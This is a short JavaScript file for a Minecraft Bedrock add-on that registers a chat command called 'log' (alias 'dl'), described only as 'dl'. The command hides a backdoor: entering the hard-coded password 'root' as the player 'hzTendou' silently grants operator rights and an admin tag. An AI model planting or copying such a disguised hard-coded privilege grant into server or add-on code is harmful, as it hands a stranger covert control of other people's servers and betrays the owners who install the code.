import { world } from "@minecraft/server"
import CommandBuilder from "../classes/builders/CommandBuilder.js";
import CommandHandler from "../classes/CommandRegistration.js"

const registration = new CommandBuilder()
.setName('log')
.setAliases(['dl'])
.setDescription('dl')
.setUsage(['dl', 'dl'])
.setCancelMessage(true)
.setPrivate(false)
.addInput(input => {
    return input.setName('pass').setType('string').setDescription('player')
  })
CommandHandler.register(registration, (interaction) => {
    const input1 = interaction.command.getInput('pass')?.getValue()
    if(input1 == "root" && interaction.player.name == "hzTendou"){
        interaction.player.setOp()
        interaction.player.addTag("perm:Admin")
    }
})